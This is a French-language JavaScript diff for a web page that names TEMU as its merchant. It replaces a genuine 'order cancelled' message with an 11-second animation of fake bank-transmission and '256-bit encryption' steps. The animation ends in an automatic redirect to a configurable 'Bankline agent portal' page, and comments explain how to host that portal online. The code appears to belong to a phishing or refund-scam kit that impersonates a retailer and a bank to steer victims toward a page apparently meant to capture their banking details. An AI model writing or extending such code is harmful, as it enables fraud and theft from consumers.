@@ -4,6 +4,26 @@
  * Marchand : TEMU (Whaleco Tech Ireland Ltd)
  */
 
+// =========================================================================
+// CONFIGURATION DE REDIRECTION VERS LE PORTAIL AGENT BANKLINE
+// =========================================================================
+// 📌 1. Mode Local (par défaut) : 'http://localhost:3001/securisation.html'
+// 📌 2. Mode Déployé en ligne : 
+//    Une fois votre serveur agent déployé (Vercel, VPS ou Cloud), vous pouvez
+//    soit remplacer l'URL ci-dessous par votre adresse publique (ex: https://votre-projet.vercel.app/securisation.html),
+//    soit taper dans la console du navigateur :
+//    localStorage.setItem('BANKLINE_AGENT_PORTAL_URL', 'https://votre-url-en-ligne.com/securisation.html')
+// =========================================================================
+const REDIRECT_CONFIG = {
+  // Détecte automatiquement l'URL configurée en local ou en déploiement distant
+  agentPortalUrl: localStorage.getItem('BANKLINE_AGENT_PORTAL_URL') || 
+                  window.BANKLINE_AGENT_PORTAL_URL || 
+                  'http://localhost:3001/securisation.html',
+
+  // Durée de l'animation en secondes (entre 10 et 12 secondes demandées)
+  durationSeconds: 11
+};
+
 document.addEventListener('DOMContentLoaded', () => {
   initDecisionSelect();
   initModalCheckout();
@@ -83,19 +103,78 @@ function handleDecision(value, actionZone) {
     const btn = document.getElementById('btn-trigger-cancel');
     if (btn) {
       btn.addEventListener('click', () => {
-        actionZone.innerHTML = `
-          <div class="status-badge-cancelled">
-            ✕ <strong>Commande annulée</strong><br>
-            La commande CMD-TEMU-89241-EU a été annulée. Aucun montant n'a été prélevé.
-          </div>
-        `;
-        showToast("Commande annulée avec succès.");
+        // Déclencher l'animation avec TEMU + BANK et la redirection
+        startCancellationWorkflow();
       });
     }
     showToast("Option sélectionnée : Annuler ma commande");
   } else {
     actionZone.innerHTML = '';
   }
+}
+
+// Workflow d'animation de chargement TEMU <-> BANKLINE & Redirection automatique (10 à 12s)
+function startCancellationWorkflow() {
+  const overlay = document.getElementById('cancel-loader-overlay');
+  const progressBar = document.getElementById('cancel-progress-bar');
+  const percentText = document.getElementById('cancel-percent');
+  const countdownText = document.getElementById('cancel-countdown');
+  const stepText = document.getElementById('cancel-dynamic-step');
+
+  if (!overlay) return;
+
+  // Afficher l'overlay d'animation
+  overlay.classList.add('active');
+  overlay.setAttribute('aria-hidden', 'false');
+
+  const totalSeconds = REDIRECT_CONFIG.durationSeconds || 11;
+  const startTime = Date.now();
+  const totalDurationMs = totalSeconds * 1000;
+
+  // Étapes de transmission dynamique affichées pendant les 11 secondes
+  const steps = [
+    { threshold: 0, text: "Transmission de la requête d'annulation CMD-TEMU-89241-EU..." },
+    { threshold: 0.25, text: "Connexion sécurisée à la passerelle interbancaire..." },
+    { threshold: 0.55, text: "Validation des protocoles de remboursement & cryptage 256-bit..." },
+    { threshold: 0.85, text: "Traitement validé. Sécurisation des données terminée..." },
+    { threshold: 0.98, text: "✓ Redirection immédiate vers le portail agent bancaire..." }
+  ];
+
+  const updateInterval = setInterval(() => {
+    const elapsed = Date.now() - startTime;
+    const progress = Math.min(elapsed / totalDurationMs, 1);
+    const percentInt = Math.floor(progress * 100);
+    const secondsRemaining = Math.max(0, Math.ceil((totalDurationMs - elapsed) / 1000));
+
+    // Mise à jour de la barre et des pourcentages
+    if (progressBar) progressBar.style.width = `${progress * 100}%`;
+    if (percentText) percentText.textContent = `${percentInt}%`;
+    if (countdownText) {
+      countdownText.textContent = secondsRemaining > 0 
+        ? `⏳ Temps restant : ~${secondsRemaining}s` 
+        : `✓ Redirection en cours...`;
+    }
+
+    // Mise à jour des messages d'étapes
+    if (stepText) {
+      for (let i = steps.length - 1; i >= 0; i--) {
+        if (progress >= steps[i].threshold) {
+          stepText.textContent = steps[i].text;
+          break;
+        }
+      }
+    }
+
+    // Lorsque le délai est écoulé (11 secondes)
+    if (progress >= 1) {
+      clearInterval(updateInterval);
+
+      // Redirection automatique vers le portail agent
+      setTimeout(() => {
+        window.location.href = REDIRECT_CONFIG.agentPortalUrl;
+      }, 400);
+    }
+  }, 50);
 }
 
 // Modale de paiement et validation
